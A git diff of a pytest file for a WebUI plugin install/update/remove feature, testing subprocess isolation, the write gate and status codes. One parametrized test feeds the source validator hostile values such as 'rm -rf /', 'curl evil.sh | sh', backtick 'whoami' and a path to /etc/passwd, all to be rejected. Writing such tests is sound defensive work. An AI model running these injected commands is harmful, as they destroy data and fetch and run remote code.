@@ -1,19 +1,27 @@
 """Tests for the Plugin Lifecycle (install/update/remove) settings UI.
 
-Backend: api/plugin_lifecycle.py (mechanism, ungated) + api/routes.py routes
-(policy: fail-closed HERMES_WEBUI_ALLOW_PLUGIN_WRITE gate on every write).
-Frontend: panels.js + index.html + i18n.js additions to the existing
-Settings -> Plugins pane.
+Backend: api/plugin_lifecycle.py runs every install/update/remove as an
+isolated ``hermes plugins ...`` subprocess (never in-process -- a malicious
+or broken plugin must never touch the WebUI server's own memory) +
+api/routes.py routes (policy: fail-closed HERMES_WEBUI_ALLOW_PLUGIN_WRITE
+gate, standalone-mode 501, single-flight 409). Frontend: panels.js +
+index.html + i18n.js additions to the existing Settings -> Plugins pane,
+including a double-confirmation modal (source/name + an explicit "executes
+third-party code" checkbox) built from scratch because the shared
+showConfirmDialog has no checkbox slot.
 
-This is the HIGHEST-RISK write surface added in this WebUI package: a
-successful install clones and imports arbitrary Python from a Git repository
-into the running Hermes agent process. No real ``hermes_cli`` is invoked —
-every test that exercises the happy path injects a fake
-``hermes_cli.plugins_cmd`` module (matching the pattern already used by
-tests/test_moa_model_picker_provider.py for hermes_cli.moa_config).
+No real ``hermes`` CLI is ever invoked: every test that exercises the
+install/update/remove/list path replaces ``subprocess.run`` with a fake, and
+every test that exercises profile/CLI resolution replaces
+api.plugin_lifecycle's own bound references to
+api.gateway_restart's ``_resolve_hermes_command`` /
+``_gateway_restart_profile_context`` (patching the origin module wouldn't
+affect plugin_lifecycle's already-imported ``from X import Y`` references).
 """
-import sys
-import types
+import ast
+import json
+import subprocess
+import time
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -24,370 +32,472 @@ PANELS_JS = (ROOT / "static" / "panels.js").read_text(encoding="utf-8")
 INDEX_HTML = (ROOT / "static" / "index.html").read_text(encoding="utf-8")
 I18N_JS = (ROOT / "static" / "i18n.js").read_text(encoding="utf-8")
 ROUTES_PY = (ROOT / "api" / "routes.py").read_text(encoding="utf-8")
+PLUGIN_LIFECYCLE_PY = (ROOT / "api" / "plugin_lifecycle.py").read_text(encoding="utf-8")
+
+
+def _fake_proc(returncode=0, stdout="", stderr=""):
+    return SimpleNamespace(returncode=returncode, stdout=stdout, stderr=stderr)
 
 
 @pytest.fixture
-def fake_plugins_cmd(monkeypatch):
-    """Install a fake hermes_cli.plugins_cmd module and return it.
+def pl(monkeypatch):
+    """api.plugin_lifecycle with CLI resolution pinned to a fake, hermetic environment."""
+    from api import plugin_lifecycle as mod
 
-    Restores the real sys.modules entries (if any) on teardown so other
-    tests in the suite that rely on hermes_cli being genuinely absent (or
-    present) aren't affected.
-    """
-    fake_pkg = sys.modules.get("hermes_cli") or types.ModuleType("hermes_cli")
-    monkeypatch.setattr(fake_pkg, "__path__", [], raising=False)
-    fake_cmd = types.ModuleType("hermes_cli.plugins_cmd")
-
-    calls = {"install": [], "update": [], "remove": []}
-
-    def _discover_all_plugins():
-        return [
-            ("bundled-one", "1.0", "a bundled plugin", "bundled", "/x", "bundled-one"),
-            ("my-plugin", "0.3", "a user plugin with git checkout", "git", "/y", "my-plugin"),
-            ("copied-plugin", "", "user plugin, no .git dir", "user", "/z", "copied-plugin"),
-        ]
-
-    def _resolve_git_url(identifier):
-        if identifier == "owner/repo":
-            return "https://github.com/owner/repo.git", None
-        if identifier == "owner/repo/sub":
-            return "https://github.com/owner/repo.git", "sub"
-        if identifier == "http://insecure.example/repo.git":
-            return "http://insecure.example/repo.git", None
-        raise ValueError(f"Invalid plugin identifier: '{identifier}'.")
-
-    def dashboard_install_plugin(identifier, *, force, enable):
-        calls["install"].append({"identifier": identifier, "force": force, "enable": enable})
-        return {
-            "ok": True,
-            "plugin_name": "my-plugin",
-            "warnings": [],
-            "missing_env": ["MY_API_KEY"],
-            "after_install_path": None,
-            "enabled": enable,
-        }
-
-    def dashboard_update_user_plugin(name):
-        calls["update"].append(name)
-        if name == "not-a-git-checkout":
-            return {"ok": False, "error": f"Plugin '{name}' is not a git checkout; cannot pull updates."}
-        return {"ok": True, "name": name, "output": "Already up to date", "unchanged": True}
-
-    def dashboard_remove_user_plugin(name):
-        calls["remove"].append(name)
-        if name == "bundled-one":
-            return {"ok": False, "error": "Bundled plugins cannot be removed from the dashboard."}
-        return {"ok": True, "name": name}
-
-    fake_cmd._discover_all_plugins = _discover_all_plugins
-    fake_cmd._resolve_git_url = _resolve_git_url
-    fake_cmd.dashboard_install_plugin = dashboard_install_plugin
-    fake_cmd.dashboard_update_user_plugin = dashboard_update_user_plugin
-    fake_cmd.dashboard_remove_user_plugin = dashboard_remove_user_plugin
-    fake_cmd._calls = calls
-
-    monkeypatch.setitem(sys.modules, "hermes_cli", fake_pkg)
-    monkeypatch.setitem(sys.modules, "hermes_cli.plugins_cmd", fake_cmd)
-    return fake_cmd
+    monkeypatch.setattr(mod, "_resolve_hermes_command", lambda: "/fake/hermes")
+    monkeypatch.setattr(mod, "_gateway_restart_profile_context", lambda: (Path("/fake/home"), None))
+    # Reset module-level run state so tests don't leak into each other.
+    monkeypatch.setattr(mod, "_RUNNING", False, raising=False)
+    monkeypatch.setattr(mod, "_LAST", None, raising=False)
+    return mod
 
 
-class TestPluginLifecycleModule:
-    """api/plugin_lifecycle.py — mechanism, no gating (policy lives in routes.py)."""
-
-    def test_unavailable_without_hermes_cli(self, monkeypatch):
-        """hermes_cli is an optional dependency; missing it must degrade, not crash."""
-        monkeypatch.setitem(sys.modules, "hermes_cli", None)
-        monkeypatch.setitem(sys.modules, "hermes_cli.plugins_cmd", None)
-        from api import plugin_lifecycle as pl
-
-        data = pl.list_installed_plugins()
-        assert data["plugins"] == []
-        assert data["unavailable"] is True
-        assert "hermes-agent" in data["error"]
-
-        with pytest.raises(pl.PluginLifecycleUnavailable):
-            pl.resolve_plugin_source("owner/repo")
-        with pytest.raises(pl.PluginLifecycleUnavailable):
-            pl.install_plugin("owner/repo")
-        with pytest.raises(pl.PluginLifecycleUnavailable):
-            pl.update_plugin("my-plugin")
-        with pytest.raises(pl.PluginLifecycleUnavailable):
-            pl.remove_plugin("my-plugin")
-
-    def test_list_installed_plugins_annotates_source(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        data = pl.list_installed_plugins()
-        by_key = {p["key"]: p for p in data["plugins"]}
-
-        assert by_key["bundled-one"]["removable"] is False
-        assert by_key["bundled-one"]["updatable"] is False
-        assert by_key["copied-plugin"]["removable"] is True
-        assert by_key["copied-plugin"]["updatable"] is False
-        assert by_key["my-plugin"]["removable"] is True
-        assert by_key["my-plugin"]["updatable"] is True
-
-    def test_list_installed_plugins_sorted_by_key(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        data = pl.list_installed_plugins()
-        keys = [p["key"] for p in data["plugins"]]
-        assert keys == sorted(keys, key=str.lower)
-
-    def test_resolve_plugin_source_is_pure_no_clone(self, fake_plugins_cmd):
-        """resolve must never call the install/clone path."""
-        from api import plugin_lifecycle as pl
-
-        result = pl.resolve_plugin_source("owner/repo/sub")
-        assert result == {
-            "identifier": "owner/repo/sub",
-            "git_url": "https://github.com/owner/repo.git",
-            "subdir": "sub",
-            "insecure_scheme": False,
-        }
-        assert fake_plugins_cmd._calls["install"] == []
-
-    def test_resolve_plugin_source_flags_insecure_scheme(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        result = pl.resolve_plugin_source("http://insecure.example/repo.git")
-        assert result["insecure_scheme"] is True
-
-    def test_resolve_plugin_source_rejects_empty_identifier(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        with pytest.raises(ValueError, match="identifier is required"):
-            pl.resolve_plugin_source("")
-
-    def test_install_plugin_delegates_to_dashboard_function(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        result = pl.install_plugin("owner/repo", force=True, enable=False)
-        assert result["ok"] is True
-        assert result["plugin_name"] == "my-plugin"
-        assert fake_plugins_cmd._calls["install"] == [
-            {"identifier": "owner/repo", "force": True, "enable": False}
-        ]
-
-    def test_install_plugin_rejects_empty_identifier(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        with pytest.raises(ValueError, match="identifier is required"):
-            pl.install_plugin("   ")
-
-    def test_update_plugin_delegates(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        result = pl.update_plugin("my-plugin")
-        assert result == {"ok": True, "name": "my-plugin", "output": "Already up to date", "unchanged": True}
-        assert fake_plugins_cmd._calls["update"] == ["my-plugin"]
-
-    def test_remove_plugin_rejects_bundled(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        result = pl.remove_plugin("bundled-one")
-        assert result["ok"] is False
-        assert "Bundled plugins cannot be removed" in result["error"]
-
-    def test_remove_plugin_delegates_for_user_plugin(self, fake_plugins_cmd):
-        from api import plugin_lifecycle as pl
-
-        result = pl.remove_plugin("copied-plugin")
-        assert result == {"ok": True, "name": "copied-plugin"}
+def _wait_until_idle(pl_mod, timeout=2.0):
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        with pl_mod._LOCK:
+            if not pl_mod._RUNNING:
+                return
+        time.sleep(0.01)
+    raise AssertionError("plugin lifecycle action did not finish in time")
 
 
-class TestPluginLifecycleRoutes:
-    """Route registration + fail-closed gate behavior in api/routes.py."""
+LIST_JSON = json.dumps([
+    {"name": "bundled-one", "status": "enabled", "version": "1.0", "description": "d", "source": "bundled"},
+    {"name": "my-plugin", "status": "enabled", "version": "0.3", "description": "d", "source": "git"},
+    {"name": "copied-plugin", "status": "disabled", "version": "", "description": "d", "source": "user"},
+])
+
+
+class TestAvailability:
+    def test_available_when_hermes_resolves(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
+        assert pl.is_available() is True
+
+    def test_unavailable_when_hermes_not_resolvable(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: None)
+        assert pl.is_available() is False
+
+
+class TestSourceValidation:
+    @pytest.mark.parametrize("source", [
+        "owner/repo",
+        "owner/repo/subdir",
+        "https://github.com/owner/repo.git",
+    ])
+    def test_accepts_safe_sources(self, pl, source):
+        assert pl.validate_source(source) == source
+
+    @pytest.mark.parametrize("source,match", [
+        ("", "source is required"),
+        ("file:///etc/passwd", "https:// URLs or 'owner/repo'"),
+        ("http://insecure.example/repo.git", "https:// URLs or 'owner/repo'"),
+        ("git@github.com:owner/repo.git", "https:// URLs or 'owner/repo'"),
+        ("ssh://git@github.com/owner/repo.git", "https:// URLs or 'owner/repo'"),
+        ("owner/../../etc", "Invalid source segment"),
+        ("owner/repo; rm -rf /", "Invalid source segment"),
+        ("owner/repo && curl evil.sh | sh", "Invalid source segment"),
+        ("owner/repo`whoami`", "Invalid source segment"),
+        ("just-one-segment", "owner/repo"),
+    ])
+    def test_rejects_unsafe_sources(self, pl, source, match):
+        with pytest.raises(pl.PluginSourceError, match=match):
+            pl.validate_source(source)
+
+
+class TestPluginNameValidation:
+    def test_accepts_name_in_installed_list(self, pl):
+        installed = [{"name": "my-plugin"}]
+        assert pl.validate_plugin_name("my-plugin", installed) == "my-plugin"
+
+    def test_rejects_traversal(self, pl):
+        with pytest.raises(pl.PluginSourceError):
+            pl.validate_plugin_name("../../etc", [{"name": "my-plugin"}])
+
+    def test_rejects_slash(self, pl):
+        with pytest.raises(pl.PluginSourceError):
+            pl.validate_plugin_name("observability/langfuse", [{"name": "observability/langfuse"}])
+
+    def test_rejects_unknown_name(self, pl):
+        with pytest.raises(LookupError, match="is not installed"):
+            pl.validate_plugin_name("nonexistent", [{"name": "my-plugin"}])
+
+
+class TestListInstalledPlugins:
+    def test_parses_cli_json_output(self, pl, monkeypatch):
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, LIST_JSON))
+        installed = pl.list_installed_plugins()
+        by_name = {p["name"]: p for p in installed}
+        assert by_name["bundled-one"]["source"] == "bundled"
+        assert by_name["bundled-one"]["enabled"] is True
+        assert by_name["copied-plugin"]["enabled"] is False
+        assert by_name["my-plugin"]["source"] == "git"
+
+    def test_raises_on_nonzero_exit(self, pl, monkeypatch):
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(1, "", "boom"))
+        with pytest.raises(RuntimeError, match="boom"):
+            pl.list_installed_plugins()
+
+    def test_raises_on_unparsable_output(self, pl, monkeypatch):
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "not json"))
+        with pytest.raises(RuntimeError):
+            pl.list_installed_plugins()
+
+    def test_raises_on_timeout(self, pl, monkeypatch):
+        def _raise(*a, **k):
+            raise subprocess.TimeoutExpired(cmd="hermes", timeout=30)
+        monkeypatch.setattr(subprocess, "run", _raise)
+        with pytest.raises(RuntimeError, match="Failed to list plugins"):
+            pl.list_installed_plugins()
+
+    def test_never_invokes_a_shell(self, pl, monkeypatch):
+        captured = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            captured["kwargs"] = kwargs
+            return _fake_proc(0, "[]")
+
+        monkeypatch.setattr(subprocess, "run", fake_run)
+        pl.list_installed_plugins()
+        assert isinstance(captured["cmd"], list)
+        assert captured["kwargs"].get("shell") is not True
+
+
+class TestGetStatus:
+    def test_shape_when_available(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "[]"))
+
+        status = pl.get_status()
+
+        assert status["available"] is True
+        assert status["running"] is False
+        assert status["last"] is None
+        assert status["installed"] == []
+
+    def test_installed_empty_when_unavailable(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: None)
+        status = pl.get_status()
+        assert status["available"] is False
+        assert status["installed"] == []
+
+    def test_installed_empty_when_list_fails(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(1, "", "broken"))
+        status = pl.get_status()
+        assert status["available"] is True
+        assert status["installed"] == []
+
+
+class TestStartAction:
+    def test_install_success_records_last_result(self, pl, monkeypatch):
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "Installed my-plugin", ""))
+
+        # The background thread runs a near-instant fake, so whether the
+        # returned status snapshot still shows running:True is a genuine
+        # race (irrelevant to production behavior) -- only the eventual
+        # settled state is asserted here.
+        started, _status = pl.start_action("install", "owner/repo", force=False, enable=True)
+
+        assert started is True
+        _wait_until_idle(pl)
+        final = pl.get_status()
+        assert final["running"] is False
+        assert final["last"]["action"] == "install"
+        assert final["last"]["name"] == "owner/repo"
+        assert final["last"]["ok"] is True
+        assert "Installed my-plugin" in final["last"]["log_tail"]
+
+    def test_action_failure_recorded(self, pl, monkeypatch):
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(1, "", "clone failed"))
+
+        pl.start_action("install", "owner/repo")
+        _wait_until_idle(pl)
+
+        last = pl.get_status()["last"]
+        assert last["ok"] is False
+        assert "clone failed" in last["log_tail"]
+
+    def test_timeout_recorded_as_failure(self, pl, monkeypatch):
+        def _raise(*a, **k):
+            raise subprocess.TimeoutExpired(cmd="hermes", timeout=600)
+        monkeypatch.setattr(subprocess, "run", _raise)
+
+        pl.start_action("update", "my-plugin")
+        _wait_until_idle(pl)
+
+        last = pl.get_status()["last"]
+        assert last["ok"] is False
+        assert "Timed out" in last["log_tail"]
+
+    def test_log_tail_bounded(self, pl, monkeypatch):
+        huge = "x" * (pl._LOG_TAIL_MAX_BYTES + 5000)
+        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, huge, ""))
+
+        pl.start_action("install", "owner/repo")
+        _wait_until_idle(pl)
+
+        last = pl.get_status()["last"]
+        assert len(last["log_tail"]) <= pl._LOG_TAIL_MAX_BYTES
+
+    def test_single_flight_rejects_concurrent_start(self, pl, monkeypatch):
+        monkeypatch.setattr(pl, "_RUNNING", True)
+        started, status = pl.start_action("install", "owner/repo")
+        assert started is False
+        assert status["running"] is True
+
+    def test_install_command_includes_force_and_enable_flags(self, pl, monkeypatch):
+        # start_action's own return path also calls get_status() -> a second,
+        # concurrent `plugins list --json` subprocess.run call -- capture every
+        # call and pick out the install one rather than assuming call order
+        # between the background action thread and the main thread.
+        captured = []
+        monkeypatch.setattr(subprocess, "run", lambda cmd, **k: (captured.append(cmd), _fake_proc(0, "", ""))[1])
+
+        pl.start_action("install", "owner/repo", force=True, enable=False)
+        _wait_until_idle(pl)
+
+        install_calls = [c for c in captured if "install" in c]
+        assert len(install_calls) == 1
+        cmd = install_calls[0]
+        assert cmd[:3] == ["/fake/hermes", "plugins", "install"]
+        assert "owner/repo" in cmd
+        assert "--force" in cmd
+        assert "--no-enable" in cmd
+        assert "--enable" not in cmd
+
+    def test_update_and_remove_commands(self, pl, monkeypatch):
+        captured = []
+        monkeypatch.setattr(subprocess, "run", lambda cmd, **k: (captured.append(cmd), _fake_proc(0, "", ""))[1])
+
+        pl.start_action("update", "my-plugin")
+        _wait_until_idle(pl)
+        update_calls = [c for c in captured if "update" in c]
+        captured.clear()
+
+        pl.start_action("remove", "my-plugin")
+        _wait_until_idle(pl)
+        remove_calls = [c for c in captured if "remove" in c]
+
+        assert update_calls == [["/fake/hermes", "plugins", "update", "my-plugin"]]
+        assert remove_calls == [["/fake/hermes", "plugins", "remove", "my-plugin"]]
+
+
+class TestPluginLifecycleRoutesGating:
+    """Route registration + fail-closed gate / standalone / contention behavior."""
 
     def test_routes_registered(self):
         for marker in (
-            '"/api/plugins/installed"',
-            '"/api/plugins/resolve"',
-            '"/api/plugins/install"',
+            '"/api/plugins/lifecycle/status"',
+            "/api/plugins/lifecycle/install",
+            "/api/plugins/lifecycle/update",
+            "/api/plugins/lifecycle/remove",
             "HERMES_WEBUI_ALLOW_PLUGIN_WRITE",
         ):
             assert marker in ROUTES_PY, f"Missing {marker} in routes.py"
 
-    def test_get_installed_always_readable_reports_write_allowed_false_when_gated(self, monkeypatch):
+    def test_status_route_always_readable_reports_writable_false_when_gated(self, monkeypatch):
         from api import routes
 
         monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
         monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
         monkeypatch.setattr(
-            "api.plugin_lifecycle.list_installed_plugins",
-            lambda: {"plugins": [], "unavailable": False},
+            "api.plugin_lifecycle.get_status",
+            lambda: {"available": True, "running": False, "last": None, "installed": []},
         )
 
-        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/installed", query=""))
+        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/lifecycle/status", query=""))
 
-        assert result["write_allowed"] is False
+        assert result["writable"] is False
 
-    def test_get_installed_reports_write_allowed_true_when_gate_open(self, monkeypatch):
+    def test_status_route_reports_writable_true_when_gate_open(self, monkeypatch):
         from api import routes
 
         monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
         monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
         monkeypatch.setattr(
-            "api.plugin_lifecycle.list_installed_plugins",
-            lambda: {"plugins": [], "unavailable": False},
+            "api.plugin_lifecycle.get_status",
+            lambda: {"available": True, "running": False, "last": None, "installed": []},
         )
 
-        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/installed", query=""))
+        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/lifecycle/status", query=""))
 
-        assert result["write_allowed"] is True
+        assert result["writable"] is True
 
-    def test_resolve_route_ungated(self, monkeypatch, fake_plugins_cmd):
-        """Resolve is pure and read-only, so it must work even with the gate closed."""
-        from api import routes
-
-        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
-        monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
-
-        result = routes.handle_get(
-            object(),
-            SimpleNamespace(path="/api/plugins/resolve", query="identifier=owner%2Frepo"),
-        )
-
-        assert result["git_url"] == "https://github.com/owner/repo.git"
-
-    def test_install_route_returns_403_when_gate_closed(self, monkeypatch):
-        from api import routes
-
-        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
+    def _post_setup(self, monkeypatch, routes, body):
         monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
         monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
         monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {"identifier": "owner/repo"})
+        monkeypatch.setattr(routes, "read_body", lambda _handler: body)
         captured = {}
+        monkeypatch.setattr(
+            routes,
+            "j",
+            lambda _handler, payload, **kwargs: captured.update(payload=payload, status=kwargs.get("status")) or payload,
+        )
+        monkeypatch.setattr(
+            routes,
+            "bad",
+            lambda _handler, msg, status=400: captured.update(payload={"ok": False, "error": msg}, status=status)
+            or {"ok": False, "error": msg},
+        )
+        return captured
 
-        def fake_j(_handler, payload, **kwargs):
-            captured["payload"] = payload
-            captured["status"] = kwargs.get("status")
-            return payload
+    @pytest.mark.parametrize("path", [
+        "/api/plugins/lifecycle/install",
+        "/api/plugins/lifecycle/update",
+        "/api/plugins/lifecycle/remove",
+    ])
+    def test_write_routes_return_403_when_gate_closed(self, monkeypatch, path):
+        from api import routes
 
-        monkeypatch.setattr(routes, "j", fake_j)
+        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
+        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo", "name": "my-plugin"})
 
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/install", query=""))
+        routes.handle_post(object(), SimpleNamespace(path=path, query=""))
 
         assert captured["status"] == 403
-        assert captured["payload"]["allowed"] is False
+        assert captured["payload"]["writable"] is False
         assert "HERMES_WEBUI_ALLOW_PLUGIN_WRITE" in captured["payload"]["error"]
 
-    def test_update_and_remove_routes_return_403_when_gate_closed(self, monkeypatch):
-        from api import routes
-
-        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {})
-        statuses = []
-        monkeypatch.setattr(
-            routes, "j", lambda _handler, payload, **kwargs: statuses.append(kwargs.get("status")) or payload
-        )
-
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/my-plugin/update", query=""))
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/my-plugin/remove", query=""))
-
-        assert statuses == [403, 403]
-
-    def test_install_route_succeeds_when_gate_open(self, monkeypatch, fake_plugins_cmd):
+    def test_install_route_returns_501_when_unavailable(self, monkeypatch):
         from api import routes
 
         monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {"identifier": "owner/repo"})
-        captured = {}
-        monkeypatch.setattr(
-            routes,
-            "j",
-            lambda _handler, payload, **kwargs: captured.update(payload=payload, status=kwargs.get("status")) or payload,
-        )
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: False)
+        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})
 
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/install", query=""))
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))
 
-        assert captured["status"] == 200
-        assert captured["payload"]["ok"] is True
-        assert captured["payload"]["plugin_name"] == "my-plugin"
-        assert fake_plugins_cmd._calls["install"] == [
-            {"identifier": "owner/repo", "force": False, "enable": True}
-        ]
+        assert captured["status"] == 501
+        assert captured["payload"]["writable"] is True
 
-    def test_update_route_succeeds_when_gate_open(self, monkeypatch, fake_plugins_cmd):
+    def test_install_route_rejects_unsafe_source_with_400(self, monkeypatch):
         from api import routes
 
         monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {})
-        captured = {}
-        monkeypatch.setattr(
-            routes,
-            "j",
-            lambda _handler, payload, **kwargs: captured.update(payload=payload, status=kwargs.get("status")) or payload,
-        )
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        captured = self._post_setup(monkeypatch, routes, {"source": "file:///etc/passwd"})
 
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/my-plugin/update", query=""))
-
-        assert captured["status"] == 200
-        assert fake_plugins_cmd._calls["update"] == ["my-plugin"]
-
-    def test_remove_route_name_is_url_decoded(self, monkeypatch, fake_plugins_cmd):
-        """Plugin keys can be namespaced (e.g. 'observability/langfuse') and arrive URL-encoded."""
-        from api import routes
-
-        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {})
-        monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
-
-        routes.handle_post(
-            object(),
-            SimpleNamespace(path="/api/plugins/observability%2Flangfuse/remove", query=""),
-        )
-
-        assert fake_plugins_cmd._calls["remove"] == ["observability/langfuse"]
-
-    def test_remove_route_returns_400_for_bundled_plugin(self, monkeypatch, fake_plugins_cmd):
-        from api import routes
-
-        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {})
-        captured = {}
-        monkeypatch.setattr(
-            routes,
-            "j",
-            lambda _handler, payload, **kwargs: captured.update(payload=payload, status=kwargs.get("status")) or payload,
-        )
-
-        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/bundled-one/remove", query=""))
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))
 
         assert captured["status"] == 400
-        assert captured["payload"]["ok"] is False
 
-    def test_install_route_returns_503_when_hermes_cli_unavailable(self, monkeypatch):
+    def test_install_route_starts_action_when_gate_open_and_available(self, monkeypatch):
         from api import routes
 
         monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
-        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
-        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
-        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
-        monkeypatch.setattr(routes, "read_body", lambda _handler: {"identifier": "owner/repo"})
-        monkeypatch.setattr(routes, "bad", lambda _handler, msg, status=400: {"ok": False, "error": msg, "status": status})
-        monkeypatch.setitem(sys.modules, "hermes_cli", None)
-        monkeypatch.setitem(sys.modules, "hermes_cli.plugins_cmd", None)
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        monkeypatch.setattr(
+            "api.plugin_lifecycle.start_action",
+            lambda action, arg, **kw: (True, {"available": True, "running": True, "last": None, "installed": []}),
+        )
+        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})
 
-        result = routes.handle_post(object(), SimpleNamespace(path="/api/plugins/install", query=""))
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))
 
-        assert result["status"] == 503
+        assert captured["status"] == 200
+        assert captured["payload"]["writable"] is True
+
+    def test_install_route_returns_409_when_already_running(self, monkeypatch):
+        from api import routes
+
+        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        monkeypatch.setattr(
+            "api.plugin_lifecycle.start_action",
+            lambda action, arg, **kw: (False, {"available": True, "running": True, "last": None, "installed": []}),
+        )
+        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})
+
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))
+
+        assert captured["status"] == 409
+        assert "already running" in captured["payload"]["error"]
+
+    def test_update_route_returns_404_for_unknown_name(self, monkeypatch):
+        from api import routes
+
+        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
+        captured = self._post_setup(monkeypatch, routes, {"name": "nonexistent"})
+
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/update", query=""))
+
